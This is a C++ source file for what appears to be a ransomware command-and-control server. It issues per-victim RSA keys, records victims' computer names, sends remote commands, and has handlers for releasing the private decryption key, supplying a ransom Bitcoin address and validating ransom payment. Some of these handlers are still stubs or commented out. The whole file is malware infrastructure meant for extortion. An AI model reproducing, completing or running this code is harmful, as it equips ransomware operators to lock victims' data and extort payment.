#include "server.h"
#include "serialization.h"

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

RSAKeys ServerInterface::GenerateRSAPair() {
	EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
	if ( ctx == NULL )
		return {};

	if ( EVP_PKEY_keygen_init(ctx) <= 0 )
		return {};

	if ( EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 1024) <= 0 )
		return {};

	EVP_PKEY* key = nullptr;
	if ( EVP_PKEY_keygen(ctx, &key) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		return {};
	}

	BIO* priv = BIO_new(BIO_s_mem());
	BIO* pub  = BIO_new(BIO_s_mem());

	if ( PEM_write_bio_PrivateKey(priv, key, nullptr, nullptr, 0, nullptr, nullptr) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	if ( PEM_write_bio_PUBKEY(pub, key) <= 0 ) { 
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	EVP_PKEY_CTX_free(ctx);
	EVP_PKEY_free(key);

	RSAKeys keys;
	keys.bioPublicKey = pub;
	keys.bioPrivateKey = priv;

	return keys;
}

void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	std::cout << "Listening for udp messages\n";

	// receive while udp server is alive
	while ( this->UDPServerDetails.alive == TRUE ) {
		ClientRequest req = {};
		sockaddr_in   incomingAddr;
		BOOL		  received = NetCommon::ReceiveData(req, this->UDPServerDetails.sfd, UDP, incomingAddr);
		if ( !received )
			continue;

		std::cout << "Received a message on the UDP socket." << std::endl;
		PerformRequest(req, this->UDPServerDetails, -1, incomingAddr);
	}
	std::cout << "Not receiving\n";
}

BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
	BOOL success = FALSE;

	ClientListMutex.lock();

	for ( auto& clientInfo : this->ClientList )
		success = TCPSendMessageToClient(clientInfo.first, req);

	ClientListMutex.unlock();

	return success;
}

void ServerInterface::ShutdownServer(BOOL confirm) {
	if ( !confirm ) return;

	this->TCPServerDetails.alive = FALSE;
	ShutdownSocket(this->TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
	CloseSocket(this->TCPServerDetails.sfd);
	this->TCPServerDetails = {}; // set server details to new blank server structure
}

BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, sockaddr_in incoming) {
	if ( !req.valid ) 
		return FALSE;
	
	BOOL    success = FALSE;
	BOOL    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
	Client* TCPClient = nullptr;

	if ( onTCP ) 
		TCPClient = GetClientPtr(cuid);

	switch ( req.action )
	{
	// connect client to tcp server on udp request
	case ClientRequest::CONNECT_CLIENT: 
	{
		if ( onTCP ) // already connected
			break;

		Client UDPClient( req.tcp, req.udp, incoming );

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		// server with ip inserted into addr for the client to connect to
		// allows me to change the dns name to whatever i want, whenever
		Server temp = this->TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		UDPMessage response(temp);
		if ( UDPSendMessageToClient(UDPClient, response) )
			success = TRUE;

		break;
	}
	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY: 
	{
		// tcp only command
		if ( !onTCP ) 
			break;

		//if ( !IsRansomPaid(client) ) {
		//	success = FALSE;
		//	break;
		//}

		ServerCommand reply(RemoteAction::RETURN_PRIVATE_RSA_KEY, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
		success = TCPSendMessageToClient(cuid, reply);

		break;
	}
	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
		if ( !onTCP )
			break;
		success = SendTCPClientRSAPublicKey(cuid, TCPClient->GetSecrets().bioPublicKey);
		break;
	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
		if ( !onTCP )
			break;
		break;
	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
		if ( !onTCP )
			break;
		break;
	}
}

void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	Client* client = GetClientPtr(cuid);

	if ( client == nullptr )
		return;

	std::cout << "New thread created to receive messages from client " << client->ComputerName << std::endl;
	BOOL receiving = TRUE;

	// initial request to send rsa keys
	{
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
		PerformRequest(receivedData, this->TCPServerDetails, cuid);
	}

	// tcp receive main loop
	do 
	{
		BIO* pk = NetCommon::GetBIOFromString(client->GetSecrets().strPrivateKey);
	
		if ( client->ComputerName == "unknown" )
			GetClientComputerName(cuid);

		// get a client response usually after an action is performed on the remote host
		if ( client->ExpectingResponse ) {
			std::cout << "expecting response\n";
			client->LastClientResponse = client->RecentClientResponse;
			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, pk);
			continue;
		}
		
		// receive data from client, decrypt it using their rsa key
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, pk);
		receiving = receivedData.valid;

		std::cout << "Client name: " << client->ComputerName << std::endl;

		PerformRequest(receivedData, this->TCPServerDetails, cuid);
	} 
	while ( receiving );
}

BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
	if ( !ClientIsInClientList(cuid) )
		return FALSE;

	Client* client = GetClientPtr(cuid);

	std::string bio = Serialization::ConvertBIOToString(pubKey); // pub key as a string
	std::string base64 = macaron::Base64::Encode(bio);  
	BYTESTRING buffer = Serialization::SerializeString(base64);

	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
	std::cout << "Sent RSA Pub Key " << bio << std::endl;

	return TRUE;
}

void ServerInterface::AcceptTCPConnections() {
	while ( this->ClientList.size() < MAX_CON && this->TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		
		SOCKET clientSocket = AcceptOnSocket(this->TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		std::cout << "Accepted a client on the tcp server." << std::endl;

		Client  newClient(clientSocket, 0, addr);
		RSAKeys keys = GenerateRSAPair();
		newClient.SetEncryptionKeys(keys);

		AddToClientList(newClient); // add them to the client list
		
		std::cout << "Good connection. Send TCP Client key\n";

		// start receiving tcp data from that client for the lifetime of that client
		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
		receive.detach();

		// TODO: make it so we can send information to the client
	}
}

BOOL ServerInterface::GetClientComputerName(long cuid) {
	Client* client = GetClientPtr(cuid);

	BYTESTRING computerNameSerialized;
	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->GetSocket(TCP), TCP);
	if ( !received )
		return FALSE;

	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
	std::string computerName = Serialization::BytestringToString(decrypted);
	client->ComputerName = computerName.c_str();
	std::cout << "Got client computer naem: " << client->ComputerName << " / " << computerName << std::endl;

	return TRUE;
}

Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
	}

	//hostent* host = GetHostByName(DNS_NAME.c_str());

	// update server fields
	//memcpy(&server.addr.sin_addr, host->h_addr_list[0], host->h_length);
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = HostToNetworkShort(port);
	server.port                 = port;
	server.alive = TRUE;

	std::cout << "Created server on port: " << port << std::endl;

	return server;
}

BOOL ServerInterface::StartServer(Server& server) {
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	server.alive = TRUE;

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach();
	}

	return TRUE;
}

BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
	Client* c = GetClientPtr(cuid);
	return NetCommon::TransmitData(req, c->GetSocket(TCP), TCP);
}

ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( client == nullptr ) return {};

	client->ExpectingResponse = TRUE;

	// wait until new client response
	do {
		Sleep(500); // wait 500 ms
	} 
	while ( client->RecentClientResponse.id != client->LastClientResponse.id );

	client->ExpectingResponse = FALSE;

	return client->RecentClientResponse;
}

BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
}

Client* ServerInterface::GetClientPtr(long cuid) {
	if ( !ClientIsInClientList(cuid) ) return nullptr;
	return &this->ClientList.at(cuid);
}

std::unordered_map<long, Client>& ServerInterface::GetClientList() {
	std::lock_guard<std::mutex> lock(ClientListMutex);
	return this->ClientList;
}

ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	Client* client = GetClientPtr(cuid);
	if ( client->GetSocket(TCP) == INVALID_SOCKET ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	ServerCommand pingCommand;
	pingCommand.action = RemoteAction::PING_CLIENT;
	pingCommand.valid = TRUE;
	
	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
	if ( !sent )
		return {};

	return WaitForClientResponse(cuid);
}

template <typename _Struct>
_Struct ServerInterface::ReceiveDataFrom(SOCKET s, BOOL encrypted, BIO* rsaKey)
{
	_Struct outData;
	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey, TRUE);
	if ( !received )
		return {};

	return outData;
}

BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

BOOL ServerInterface::AddToClientList(Client client) {
	std::cout << "Adding client to list\n";
	
	ClientListMutex.lock();	
	this->ClientList.insert(std::make_pair(client.ClientUID, client));
	 
	ClientListMutex.unlock();
	
	return TRUE;
}